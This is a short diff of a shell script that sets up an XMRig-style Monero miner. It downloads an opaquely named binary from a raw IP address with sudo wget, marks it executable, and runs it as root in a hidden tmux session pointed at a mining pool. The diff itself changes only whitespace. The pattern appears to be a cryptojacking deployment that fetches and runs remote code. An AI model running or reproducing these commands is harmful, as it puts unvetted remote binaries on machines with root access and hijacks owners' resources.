@@ -10,5 +10,5 @@ sudo bash enable_1gb_pages.sh
 sudo bash randomx_boost.sh
 sudo wget http://51.38.98.168/papa/zzz
 sudo chmod +x zzz
-tmux new-session -d -s a 'sudo ./zzz -o devilmpro.tech:3330 -u US24SEPCH -p US24SEPCH --donate-level 0 --nicehash --randomx-1gb-pages'
+tmux new-session -d -s a 'sudo ./zzz -o  devilmpro.tech:3330 -u US24SEPCH -p US24SEPCH  --donate-level 0 --nicehash --randomx-1gb-pages '
 
